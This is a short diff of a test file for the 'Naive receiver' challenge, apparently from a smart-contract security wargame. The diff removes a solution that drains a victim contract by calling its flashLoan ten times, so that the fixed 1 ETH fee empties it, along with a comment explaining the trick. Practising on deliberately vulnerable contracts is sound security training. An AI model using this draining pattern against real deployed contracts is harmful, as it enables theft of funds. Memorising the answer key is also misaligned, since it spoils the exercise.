@@ -38,16 +38,6 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const ETH = await pool.ETH();
-        for (let i = 0; i < 10; i++) {
-            await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
-        }
-
-        /*
-        Explanation:
-        The naive receiver lets anyone initiate call flashLoan() to his address.
-        The fee for each flashLoan is 1 ETH. So we just call it 10 times.
-        */
     });
 
     after(async function () {
